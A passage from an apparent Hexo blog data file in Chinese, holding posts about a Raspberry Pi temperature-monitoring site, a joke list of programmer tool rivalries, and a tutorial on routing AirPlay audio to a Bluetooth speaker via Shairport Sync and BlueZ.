class=\"line\">&#125;)</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">// 在命令行使用 gulp auto 启动此任务</span></div><div class=\"line\">gulp.task(<span class=\"string\">'auto'</span>, <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</div><div class=\"line\">    <span class=\"comment\">// 监听文件修改，当文件被修改则执行 script 任务</span></div><div class=\"line\">    gulp.watch(<span class=\"string\">'js/*.js'</span>, [<span class=\"string\">'script'</span>])</div><div class=\"line\">    gulp.watch(<span class=\"string\">'css/*.css'</span>, [<span class=\"string\">'css'</span>])</div><div class=\"line\">&#125;)</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">// 使用 gulp.task('default') 定义默认任务</span></div><div class=\"line\"><span class=\"comment\">// 在命令行使用 gulp 启动 script 任务和 auto 任务</span></div><div class=\"line\">gulp.task(<span class=\"string\">'default'</span>, [<span class=\"string\">'script'</span>, <span class=\"string\">'css'</span> , <span class=\"string\">'auto'</span>])</div></pre></td></tr></table></figure></p>\n<p>执行gulp即可进行自动压缩及监听任务</p>\n<h1 id=\"结构优化\"><a href=\"#结构优化\" class=\"headerlink\" title=\"结构优化\"></a>结构优化</h1><p>这是原有的结构</p>\n<p>前端：Semantic UI + eCharts + JQuery Datapicker</p>\n<p>数据： json(时间)</p>\n<p>后端：Python + Apache</p>\n<p>后端的python程序负责测温度和测湿度，并生成json数据，为了保证事实性，python程序一直在读写相同的json文件，每一分钟读写一次，造成了json文件的比较大，大概有68KB，在前端是通过ajax加载的json文件，如果网速很慢的话，必然会造成很长时间的延迟。</p>\n<p>为了解决这个问题，首先第一步就是减小json文件大小。设计了一个解决方案是，以前的前端已经可以加载每小时数据和每分钟数据，不过小时和分钟的数据是通过在js中忽略加载实现的。</p>\n<p>而现在采用新的方案，在data数据目录下，分别建立两个目录。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">data/min</div><div class=\"line\">data/hour</div></pre></td></tr></table></figure>\n<p>数据： json(min) / json(hour) </p>\n<p>min的数据专门用于保存min,hour专门用于保存hour，为了解决旧数据迁移问题，首先先将内容移动到min目录下，在根目录下写了一个python小程序，执行挑选出hour数据并且迁移。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#!/usr/bin/python</span></div><div class=\"line\"><span class=\"keyword\">import</span> sys</div><div class=\"line\"><span class=\"keyword\">import</span> time</div><div class=\"line\"><span class=\"keyword\">import</span> json</div><div class=\"line\"><span class=\"keyword\">import</span> os</div><div class=\"line\"><span class=\"keyword\">import</span> string</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">jsonRead</span><span class=\"params\">(path,topath,name)</span>:</span></div><div class=\"line\">    pathfile = path + <span class=\"string\">'/'</span> + name</div><div class=\"line\">    topathfile = topath + <span class=\"string\">'/'</span> + name</div><div class=\"line\">    <span class=\"keyword\">if</span> os.path.exists(pathfile):</div><div class=\"line\">        file =open(pathfile,<span class=\"string\">\"r\"</span>)</div><div class=\"line\">        data = json.loads(file.read().decode(<span class=\"string\">'utf-8'</span>))</div><div class=\"line\">        i = <span class=\"number\">1</span></div><div class=\"line\">        jsonWrite(data[<span class=\"number\">0</span>],topathfile)</div><div class=\"line\">        <span class=\"keyword\">for</span> v <span class=\"keyword\">in</span> data:</div><div class=\"line\">            i = i + <span class=\"number\">1</span></div><div class=\"line\">            <span class=\"keyword\">if</span>(i%<span class=\"number\">60</span>==<span class=\"number\">0</span>):</div><div class=\"line\">                jsonWrite(v,topathfile)</div><div class=\"line\">        file.close()</div><div class=\"line\">    <span class=\"keyword\">else</span>:</div><div class=\"line\">        <span class=\"keyword\">print</span> <span class=\"string\">'unable to open '</span> + pathfile + <span class=\"string\">'file'</span></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">jsonWrite</span><span class=\"params\">(data,pathfile)</span>:</span></div><div class=\"line\">    <span class=\"keyword\">if</span> os.path.exists(pathfile):</div><div class=\"line\">      file =open(pathfile,<span class=\"string\">\"rb+\"</span>)</div><div class=\"line\">      file.seek(<span class=\"number\">-1</span>,os.SEEK_END)</div><div class=\"line\">      file.truncate()</div><div class=\"line\">      file.write(<span class=\"string\">\",\"</span>)</div><div class=\"line\">      json.dump(data,file)</div><div class=\"line\">      file.write(<span class=\"string\">\"]\"</span>)</div><div class=\"line\">      file.close()</div><div class=\"line\">      <span class=\"keyword\">print</span> <span class=\"string\">'succes: '</span>+ pathfile</div><div class=\"line\">    <span class=\"keyword\">else</span>:</div><div class=\"line\">      file =open(pathfile,<span class=\"string\">\"w\"</span>)</div><div class=\"line\">      file.write(<span class=\"string\">\"[\"</span>)</div><div class=\"line\">      json.dump(data,file)</div><div class=\"line\">      file.write(<span class=\"string\">\"]\"</span>)</div><div class=\"line\">      file.close()</div><div class=\"line\"></div><div class=\"line\">dir = <span class=\"string\">'web/data/min'</span></div><div class=\"line\">dist = <span class=\"string\">'web/data/hour'</span></div><div class=\"line\">files = os.listdir(dir)</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">for</span> root, dirs, files <span class=\"keyword\">in</span> os.walk(dir):</div><div class=\"line\">    <span class=\"keyword\">for</span> name <span class=\"keyword\">in</span> files:</div><div class=\"line\">        jsonRead(dir,dist,name)</div></pre></td></tr></table></figure>\n<p>与此同时也需要修改 前端js 与 后端python<br>具体代码在 <a href=\"https://github.com/yfgeek/rpi-TempRuntime/\">项目地址</a>，不贴了。</p>\n<p>最后，经过优化，速度大概提升了5倍，前端获取的json文件为1KB。</p>\n<p>后续还会增加季度数据统计，等待数据量大一点的时候方便做数据统计工作。</p>"},{"title":"程序员鄙视链","date":"2016-10-12T14:07:48.000Z","_content":"\n纯粹的一些梗，比较搞笑。来源知乎和其他网站。\n<!-- more --> \n\n# 编辑器\nEmacs → Vim → Sublime → Word → Power Point<br>Vim →→ Emacs + evil插件<br>notepad++ → notepad<br>all → Source Insight → notepad\n# 语言\nasm → C ↔ C++ ↔ Java ↔ C# → JavaScript → VB → VBScript<br>Common Lisp ↔ Scheme → Emacs Lisp →→ Python<br>Python ↔ Perl → shell<br>PHP → all\n\n# 操作系统\nUnix → Linux → Windows → DOS<br>Solaris →→ 其他Unix<br>*BSD ↔ System*<br>OpenBSD ↔ FreeBSD → NetBSD<br>Arch → Debian* → Redhat*<br>Debian → Ubuntu<br>Fedora → CentOS → RHEL<br>OSX → all\n# IDE\nEmacs + plugins ↔ Vim + plugins → 其他加插件的编辑器<br>IntelliJ → Eclipse → NetBeans<br>Code::Blocks → CodeLite<br>VS → all → Turbo C 2.0\n\n# 图片\n\n![](/content/images/chain/1.jpg)\n\n![](/content/images/chain/2.jpg)\n\n![](/content/images/chain/3.jpg)\n\n![](/content/images/chain/4.jpg)\n\n![](/content/images/chain/5.jpg)\n\n** 工具篇 **\n![](/content/images/chain/6.jpg)\n\n![](/content/images/chain/7.jpg)\n\n![](/content/images/chain/8.jpg)\n\n![](/content/images/chain/9.jpg)\n\n** 系统软件篇 **\n\n![](/content/images/chain/10.jpg)\n\n![](/content/images/chain/11.jpg)\n\n![](/content/images/chain/12.jpg)\n\n![](/content/images/chain/13.jpg)\n\n** 职场篇 **\n\n![](/content/images/chain/14.jpg)\n\n![](/content/images/chain/15.jpg)\n\n![](/content/images/chain/16.jpg)\n\n![](/content/images/chain/17.jpg)\n\n> 转载自：https://www.zhihu.com/question/24270600\n","source":"_posts/程序员鄙视链.md","raw":"---\ntitle: 程序员鄙视链\ndate: 2016-10-12 15:07:48\ntags: 笑话\ncategories: 笑话\n---\n\n纯粹的一些梗，比较搞笑。来源知乎和其他网站。\n<!-- more --> \n\n# 编辑器\nEmacs → Vim → Sublime → Word → Power Point<br>Vim →→ Emacs + evil插件<br>notepad++ → notepad<br>all → Source Insight → notepad\n# 语言\nasm → C ↔ C++ ↔ Java ↔ C# → JavaScript → VB → VBScript<br>Common Lisp ↔ Scheme → Emacs Lisp →→ Python<br>Python ↔ Perl → shell<br>PHP → all\n\n# 操作系统\nUnix → Linux → Windows → DOS<br>Solaris →→ 其他Unix<br>*BSD ↔ System*<br>OpenBSD ↔ FreeBSD → NetBSD<br>Arch → Debian* → Redhat*<br>Debian → Ubuntu<br>Fedora → CentOS → RHEL<br>OSX → all\n# IDE\nEmacs + plugins ↔ Vim + plugins → 其他加插件的编辑器<br>IntelliJ → Eclipse → NetBeans<br>Code::Blocks → CodeLite<br>VS → all → Turbo C 2.0\n\n# 图片\n\n![](/content/images/chain/1.jpg)\n\n![](/content/images/chain/2.jpg)\n\n![](/content/images/chain/3.jpg)\n\n![](/content/images/chain/4.jpg)\n\n![](/content/images/chain/5.jpg)\n\n** 工具篇 **\n![](/content/images/chain/6.jpg)\n\n![](/content/images/chain/7.jpg)\n\n![](/content/images/chain/8.jpg)\n\n![](/content/images/chain/9.jpg)\n\n** 系统软件篇 **\n\n![](/content/images/chain/10.jpg)\n\n![](/content/images/chain/11.jpg)\n\n![](/content/images/chain/12.jpg)\n\n![](/content/images/chain/13.jpg)\n\n** 职场篇 **\n\n![](/content/images/chain/14.jpg)\n\n![](/content/images/chain/15.jpg)\n\n![](/content/images/chain/16.jpg)\n\n![](/content/images/chain/17.jpg)\n\n> 转载自：https://www.zhihu.com/question/24270600\n","slug":"程序员鄙视链","published":1,"updated":"2016-11-19T12:08:18.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"civym301p0020cdon4qovu2hh","content":"<p>纯粹的一些梗，比较搞笑。来源知乎和其他网站。<br><a id=\"more\"></a> </p>\n<h1 id=\"编辑器\"><a href=\"#编辑器\" class=\"headerlink\" title=\"编辑器\"></a>编辑器</h1><p>Emacs → Vim → Sublime → Word → Power Point<br>Vim →→ Emacs + evil插件<br>notepad++ → notepad<br>all → Source Insight → notepad</p>\n<h1 id=\"语言\"><a href=\"#语言\" class=\"headerlink\" title=\"语言\"></a>语言</h1><p>asm → C ↔ C++ ↔ Java ↔ C# → JavaScript → VB → VBScript<br>Common Lisp ↔ Scheme → Emacs Lisp →→ Python<br>Python ↔ Perl → shell<br>PHP → all</p>\n<h1 id=\"操作系统\"><a href=\"#操作系统\" class=\"headerlink\" title=\"操作系统\"></a>操作系统</h1><p>Unix → Linux → Windows → DOS<br>Solaris →→ 其他Unix<br><em>BSD ↔ System</em><br>OpenBSD ↔ FreeBSD → NetBSD<br>Arch → Debian<em> → Redhat</em><br>Debian → Ubuntu<br>Fedora → CentOS → RHEL<br>OSX → all</p>\n<h1 id=\"IDE\"><a href=\"#IDE\" class=\"headerlink\" title=\"IDE\"></a>IDE</h1><p>Emacs + plugins ↔ Vim + plugins → 其他加插件的编辑器<br>IntelliJ → Eclipse → NetBeans<br>Code::Blocks → CodeLite<br>VS → all → Turbo C 2.0</p>\n<h1 id=\"图片\"><a href=\"#图片\" class=\"headerlink\" title=\"图片\"></a>图片</h1><p><img src=\"/content/images/chain/1.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/chain/2.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/chain/3.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/chain/4.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/chain/5.jpg\" alt=\"\"></p>\n<p><strong> 工具篇 </strong><br><img src=\"/content/images/chain/6.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/chain/7.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/chain/8.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/chain/9.jpg\" alt=\"\"></p>\n<p><strong> 系统软件篇 </strong></p>\n<p><img src=\"/content/images/chain/10.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/chain/11.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/chain/12.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/chain/13.jpg\" alt=\"\"></p>\n<p><strong> 职场篇 </strong></p>\n<p><img src=\"/content/images/chain/14.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/chain/15.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/chain/16.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/chain/17.jpg\" alt=\"\"></p>\n<blockquote>\n<p>转载自：<a href=\"https://www.zhihu.com/question/24270600\" target=\"_blank\" rel=\"external\">https://www.zhihu.com/question/24270600</a></p>\n</blockquote>\n","excerpt":"<p>纯粹的一些梗，比较搞笑。来源知乎和其他网站。<br>","more":"</p>\n<h1 id=\"编辑器\"><a href=\"#编辑器\" class=\"headerlink\" title=\"编辑器\"></a>编辑器</h1><p>Emacs → Vim → Sublime → Word → Power Point<br>Vim →→ Emacs + evil插件<br>notepad++ → notepad<br>all → Source Insight → notepad</p>\n<h1 id=\"语言\"><a href=\"#语言\" class=\"headerlink\" title=\"语言\"></a>语言</h1><p>asm → C ↔ C++ ↔ Java ↔ C# → JavaScript → VB → VBScript<br>Common Lisp ↔ Scheme → Emacs Lisp →→ Python<br>Python ↔ Perl → shell<br>PHP → all</p>\n<h1 id=\"操作系统\"><a href=\"#操作系统\" class=\"headerlink\" title=\"操作系统\"></a>操作系统</h1><p>Unix → Linux → Windows → DOS<br>Solaris →→ 其他Unix<br><em>BSD ↔ System</em><br>OpenBSD ↔ FreeBSD → NetBSD<br>Arch → Debian<em> → Redhat</em><br>Debian → Ubuntu<br>Fedora → CentOS → RHEL<br>OSX → all</p>\n<h1 id=\"IDE\"><a href=\"#IDE\" class=\"headerlink\" title=\"IDE\"></a>IDE</h1><p>Emacs + plugins ↔ Vim + plugins → 其他加插件的编辑器<br>IntelliJ → Eclipse → NetBeans<br>Code::Blocks → CodeLite<br>VS → all → Turbo C 2.0</p>\n<h1 id=\"图片\"><a href=\"#图片\" class=\"headerlink\" title=\"图片\"></a>图片</h1><p><img src=\"/content/images/chain/1.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/chain/2.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/chain/3.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/chain/4.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/chain/5.jpg\" alt=\"\"></p>\n<p><strong> 工具篇 </strong><br><img src=\"/content/images/chain/6.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/chain/7.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/chain/8.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/chain/9.jpg\" alt=\"\"></p>\n<p><strong> 系统软件篇 </strong></p>\n<p><img src=\"/content/images/chain/10.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/chain/11.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/chain/12.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/chain/13.jpg\" alt=\"\"></p>\n<p><strong> 职场篇 </strong></p>\n<p><img src=\"/content/images/chain/14.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/chain/15.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/chain/16.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/chain/17.jpg\" alt=\"\"></p>\n<blockquote>\n<p>转载自：<a href=\"https://www.zhihu.com/question/24270600\">https://www.zhihu.com/question/24270600</a></p>\n</blockquote>"},{"title":"用树莓派把蓝牙音响变成Airplay音响","id":"11","updated":"2016-08-07T22:28:30.000Z","date":"2016-08-07T20:23:56.000Z","_content":"\n# 前言\n最近买了小米蓝牙音响，使用一段时间后发现小米蓝牙音箱有一个极其不方便的地方就是家里苹果设备比较多，想切换设备播放的时候就比较麻烦，还要断开操作。\n于是萌生了一个想法，正好手上有个树莓派，能不能这样：\n> iOS设备->Airplay->树莓派->蓝牙->小米蓝牙音箱\n<!-- more --> \n![](/content/images/2016/08/DSC07326-5.JPG)\n\n因此这个问题可以分为两个部分：\n\n* 1.树莓派蓝牙音频配置部分\n* 2.树莓派Airplay播放部分\n\n在解决这个问题的时候，我走了不少弯路，错路，目前网上没有完整的这个问题的解决方案，此文目的正是填补网络空白。\n\n# 原料\n* 树莓派3\n* 小米蓝牙音箱\n* iOS设备\n\n# 开始\n## 树莓派安装Shairport Sync\nShairport Sync实际上是Shairport的修改版，负责让树莓派发射出稳定的Airplay，之前我一直在使用Shairport，偶然间发现这个神器，让Shairport更加稳定好用，而且加入到系统进程，开机即打开Airplay。\n安装前请确认是否安装以下依赖包：\n\n* `apt-get install build-essential git`\n* `apt-get install autoconf automake libtool libdaemon-dev libasound2-dev libpopt-dev libconfig-dev`\n* `apt-get install avahi-daemon libavahi-client-dev` \n* `apt-get install libssl-dev` \n* `apt-get install libpolarssl-dev` \n* `apt-get install libsoxr-dev` \n\n随后下载Shairport Sync：\n```bash\ngit clone https://github.com/mikebrady/shairport-sync.git\n```\n然后`cd`到相应目录，执行：\n```bash\nautoreconf -i -f\n```\n随后执行：\n```bash\n./configure --with-alsa --with-avahi --with-ssl=openssl --with-metadata --with-soxr --with-systemd\n```\n如果没问题的话，可以make了，此时该去洗手间去洗手间，该睡觉睡觉：\n```bash\nmake\n```\n创建开机启动：\n```bash\ngetent group shairport-sync &>/dev/null || sudo groupadd -r shairport-sync >/dev/null\n\ngetent passwd shairport-sync &> /dev/null || sudo useradd -r -M -g shairport-sync -s /usr/bin/nologin -G audio shairport-sync >/dev/null\n```\n然后运行：\n```bash\nsudo make install\n```\n最后输入，完成安装：\n```bash\nsudo update-rc.d shairport-sync defaults 90 10\n```\n## 树莓派安装蓝牙\n打开终端，用普通用户权限执行：\n```bash\nsudo apt-get update\nsudo apt-get updgrade -y\nsudo apt-get dist-upgrade -y\n```\n随后安装蓝牙及管理软件\n```bash\nsudo apt-get install pi-bluetooth bluez bluez-firmware blueman\n```\n将pi用户添加到蓝牙组\n```bash\nsudo usermod -G bluetooth -a pi\n```\n还有很**重要**的一条，安装蓝牙音频配置\n```bash\nsudo apt-get install pulseaudio pulseaudio-module-bluetooth\n```\n随后重启一次树莓派，开机，在图形化界面中配对蓝牙，操作比较简单，记得在配对成功后对设备进行连接，省略。\n也可通过bluetoothctl或hictool命令进行配对。\n随后记下蓝牙设备的地址，XX:XX:XX:XX:XX:XX格式。\n\n**在此步，务必通过测试音频是否能够正常与蓝牙设备通信，记得软件中要勾选蓝牙设备，否则将从3.5mm端口输出音频。推荐使用vlc播放器。**\n## 配置蓝牙音频及Shariport Sync\n安装依赖包：\n```bash\nsudo apt-get install libdbus-1-dev\nsudo apt-get install libglib2.0-dev\napt-cache search libasound\nsudo apt-get install libasound2-dev\n```\n配置及重新安装最新版bluez，此刻可以去洗手间和睡觉觉：\n```bash\nwget http://www.kernel.org/pub/linux/bluetooth/bluez-4.101.tar.xz\ntar -xvf bluez-4.101.tar.xz\ncd bluez-4.101\n./configure --prefix=/usr --mandir=/usr/share/man --sysconfdir=/etc --localstatedir=/var --libexecdir=/lib\nmake\nsudo make install\n```\n复制配置文件到目录：\n```bash\nsudo cp /home/pi/bluez-4.101/test/simple-agent /usr/bin/bluez-simple-agent\nsudo cp /home/pi/bluez-4.101/test/test-device /usr/bin/bluez-test-device\nsudo cp /home/pi/bluez-4.101/test/test-audio /usr/bin/bluez-test-audio\nsudo cp /home/pi/bluez-4.101/audio/audio.conf /etc/bluetooth/\n```\n接着运行：\n```bash\nsudo apt-get install python-dbus\nsudo apt-get install python-gobject\nsudo cp /usr/lib/alsa-lib/libasound_module_pcm_bluetooth.so /usr/lib/arm-linux-gnueabihf/alsa-lib/\n```\n编辑audio.conf文件使shariport的音频从蓝牙设备输出：\n```bash\nsudo nano /etc/bluetooth/audio.conf\n```\n```bash\n# 在[General]区域添加:\nEnable=Sink,Socket\n# 取消[A2DP]注释，并加入:\nMaxconnections=4\n```\n打开蓝牙自启动:\n```bash\nsudo systemctl enable bluetooth\n```\n重启设备后，继续配置，打开asund.conf文件：\n```bash\nsudo nano /etc/asound.conf\n```\n```javascript\npcm.bt_canz {\ntype plug\nslave {\npcm {\ntype bluetooth\ndevice XX:XX:XX:XX:XX:XX\nprofile \"auto\"\n}\n}\nhint {\nshow on\ndescription \"Mi Speaker\"\n}\n}\nctl.bt_canz {\ntype bluetooth\n}\n```\n测试bluez能否使用：`sudo bluez-simple-agent\n`，如果正常，按ctrl+c停止。\n```bash\nsudo bluez-simple-agent hci0 XX:XX:XX:XX:XX:XX\nsudo bluez-test-audio connect XX:XX:XX:XX:XX:XX\n```\n测试是否连通：`speaker-test -c 2 -D bt_canz`\n\n再次重启设备。\n开启后编辑`/etc/shairport-sync.conf `：\n```bash\nsudo nano /etc/shairport-sync.conf\n#去掉下面的注释，并加入bt_canz\noutput_device = bt_canz\n```\n保存！重启！开机即可用。\n![](/content/images/2016/08/IMG_0635.PNG)\n# 参考文章\nhttps://github.com/mikebrady/shairport-sync/issues/200\nhttps://github.com/mikebrady/shairport-sync\nhttp://shumeipai.nxez.com/2014/12/10/raspberry-pi-using-airplay-wireless-audio-playback-achieve-even-putting-wifi.html\nhttp://wangye.org/blog/archives/921/\nhttp://blog.csdn.net/huayucong/article/details/51376461\nhttp://blog.csdn.net/zhaoqi_0612/article/details/47731821\nhttp://blog.csdn.net/techtitan/article/details/6165116\nhttp://www.eeboard.com/bbs/forum.php?mod=viewthread&tid=45040&page=1","source":"_posts/用树莓派把蓝牙音响变成Airplay音响.md","raw":"---\ntitle: 用树莓派把蓝牙音响变成Airplay音响\ntags: 'Raspberry'\npermalink: airplay\nid: 11\nupdated: '2016-08-07 23:28:30'\ndate: 2016-08-07 21:23:56\n---\n\n# 前言\n最近买了小米蓝牙音响，使用一段时间后发现小米蓝牙音箱有一个极其不方便的地方就是家里苹果设备比较多，想切换设备播放的时候就比较麻烦，还要断开操作。\n于是萌生了一个想法，正好手上有个树莓派，能不能这样：\n> iOS设备->Airplay->树莓派->蓝牙->小米蓝牙音箱\n<!-- more --> \n![](/content/images/2016/08/DSC07326-5.JPG)\n\n因此这个问题可以分为两个部分：\n\n* 1.树莓派蓝牙音频配置部分\n* 2.树莓派Airplay播放部分\n\n在解决这个问题的时候，我走了不少弯路，错路，目前网上没有完整的这个问题的解决方案，此文目的正是填补网络空白。\n\n# 原料\n* 树莓派3\n* 小米蓝牙音箱\n* iOS设备\n\n# 开始\n## 树莓派安装Shairport Sync\nShairport Sync实际上是Shairport的修改版，负责让树莓派发射出稳定的Airplay，之前我一直在使用Shairport，偶然间发现这个神器，让Shairport更加稳定好用，而且加入到系统进程，开机即打开Airplay。\n安装前请确认是否安装以下依赖包：\n\n* `apt-get install build-essential git`\n* `apt-get install autoconf automake libtool libdaemon-dev libasound2-dev libpopt-dev libconfig-dev`\n* `apt-get install avahi-daemon libavahi-client-dev` \n* `apt-get install libssl-dev` \n* `apt-get install libpolarssl-dev` \n* `apt-get install libsoxr-dev` \n\n随后下载Shairport Sync：\n```bash\ngit clone https://github.com/mikebrady/shairport-sync.git\n```\n然后`cd`到相应目录，执行：\n```bash\nautoreconf -i -f\n```\n随后执行：\n```bash\n./configure --with-alsa --with-avahi --with-ssl=openssl --with-metadata --with-soxr --with-systemd\n```\n如果没问题的话，可以make了，此时该去洗手间去洗手间，该睡觉睡觉：\n```bash\nmake\n```\n创建开机启动：\n```bash\ngetent group shairport-sync &>/dev/null || sudo groupadd -r shairport-sync >/dev/null\n\ngetent passwd shairport-sync &> /dev/null || sudo useradd -r -M -g shairport-sync -s /usr/bin/nologin -G audio shairport-sync >/dev/null\n```\n然后运行：\n```bash\nsudo make install\n```\n最后输入，完成安装：\n```bash\nsudo update-rc.d shairport-sync defaults 90 10\n```\n## 树莓派安装蓝牙\n打开终端，用普通用户权限执行：\n```bash\nsudo apt-get update\nsudo apt-get updgrade -y\nsudo apt-get dist-upgrade -y\n```\n随后安装蓝牙及管理软件\n```bash\nsudo apt-get install pi-bluetooth bluez bluez-firmware blueman\n```\n将pi用户添加到蓝牙组\n```bash\nsudo usermod -G bluetooth -a pi\n```\n还有很**重要**的一条，安装蓝牙音频配置\n```bash\nsudo apt-get install pulseaudio pulseaudio-module-bluetooth\n```\n随后重启一次树莓派，开机，在图形化界面中配对蓝牙，操作比较简单，记得在配对成功后对设备进行连接，省略。\n也可通过bluetoothctl或hictool命令进行配对。\n随后记下蓝牙设备的地址，XX:XX:XX:XX:XX:XX格式。\n\n**在此步，务必通过测试音频是否能够正常与蓝牙设备通信，记得软件中要勾选蓝牙设备，否则将从3.5mm端口输出音频。推荐使用vlc播放器。**\n## 配置蓝牙音频及Shariport Sync\n安装依赖包：\n```bash\nsudo apt-get install libdbus-1-dev\nsudo apt-get install libglib2.0-dev\napt-cache search libasound\nsudo apt-get install libasound2-dev\n```\n配置及重新安装最新版bluez，此刻可以去洗手间和睡觉觉：\n```bash\nwget http://www.kernel.org/pub/linux/bluetooth/bluez-4.101.tar.xz\ntar -xvf bluez-4.101.tar.xz\ncd bluez-4.101\n./configure --prefix=/usr --mandir=/usr/share/man --sysconfdir=/etc --localstatedir=/var --libexecdir=/lib\nmake\nsudo make install\n```\n复制配置文件到目录：\n```bash\nsudo cp /home/pi/bluez-4.101/test/simple-agent /usr/bin/bluez-simple-agent\nsudo cp /home/pi/bluez-4.101/test/test-device /usr/bin/bluez-test-device\nsudo cp /home/pi/bluez-4.101/test/test-audio /usr/bin/bluez-test-audio\nsudo cp /home/pi/bluez-4.101/audio/audio.conf /etc/bluetooth/\n```\n接着运行：\n```bash\nsudo apt-get install python-dbus\nsudo apt-get install python-gobject\nsudo cp /usr/lib/alsa-lib/libasound_module_pcm_bluetooth.so /usr/lib/arm-linux-gnueabihf/alsa-lib/\n```\n编辑audio.conf文件使shariport的音频从蓝牙设备输出：\n```bash\nsudo nano /etc/bluetooth/audio.conf\n```\n```bash\n# 在[General]区域添加:\nEnable=Sink,Socket\n# 取消[A2DP]注释，并加入:\nMaxconnections=4\n```\n打开蓝牙自启动:\n```bash\nsudo systemctl enable bluetooth\n```\n重启设备后，继续配置，打开asund.conf文件：\n```bash\nsudo nano /etc/asound.conf\n```\n```javascript\npcm.bt_canz {\ntype plug\nslave {\npcm {\ntype bluetooth\ndevice XX:XX:XX:XX:XX:XX\nprofile \"auto\"\n}\n}\nhint {\nshow on\ndescription \"Mi Speaker\"\n}\n}\nctl.bt_canz {\ntype bluetooth\n}\n```\n测试bluez能否使用：`sudo bluez-simple-agent\n`，如果正常，按ctrl+c停止。\n```bash\nsudo bluez-simple-agent hci0 XX:XX:XX:XX:XX:XX\nsudo bluez-test-audio connect XX:XX:XX:XX:XX:XX\n```\n测试是否连通：`speaker-test -c 2 -D bt_canz`\n\n再次重启设备。\n开启后编辑`/etc/shairport-sync.conf `：\n```bash\nsudo nano /etc/shairport-sync.conf\n#去掉下面的注释，并加入bt_canz\noutput_device = bt_canz\n```\n保存！重启！开机即可用。\n![](/content/images/2016/08/IMG_0635.PNG)\n# 参考文章\nhttps://github.com/mikebrady/shairport-sync/issues/200\nhttps://github.com/mikebrady/shairport-sync\nhttp://shumeipai.nxez.com/2014/12/10/raspberry-pi-using-airplay-wireless-audio-playback-achieve-even-putting-wifi.html\nhttp://wangye.org/blog/archives/921/\nhttp://blog.csdn.net/huayucong/article/details/51376461\nhttp://blog.csdn.net/zhaoqi_0612/article/details/47731821\nhttp://blog.csdn.net/techtitan/article/details/6165116\nhttp://www.eeboard.com/bbs/forum.php?mod=viewthread&tid=45040&page=1","slug":"airplay","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"civym301q0023cdonu8svoxeu","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>最近买了小米蓝牙音响，使用一段时间后发现小米蓝牙音箱有一个极其不方便的地方就是家里苹果设备比较多，想切换设备播放的时候就比较麻烦，还要断开操作。<br>于是萌生了一个想法，正好手上有个树莓派，能不能这样：</p>\n<blockquote>\n<p>iOS设备-&gt;Airplay-&gt;树莓派-&gt;蓝牙-&gt;小米蓝牙音箱<br><a id=\"more\"></a><br><img src=\"/content/images/2016/08/DSC07326-5.JPG\" alt=\"\"></p>\n</blockquote>\n<p>因此这个问题可以分为两个部分：</p>\n<ul>\n<li>1.树莓派蓝牙音频配置部分</li>\n<li>2.树莓派Airplay播放部分</li>\n</ul>\n<p>在解决这个问题的时候，我走了不少弯路，错路，目前网上没有完整的这个问题的解决方案，此文目的正是填补网络空白。</p>\n<h1 id=\"原料\"><a href=\"#原料\" class=\"headerlink\" 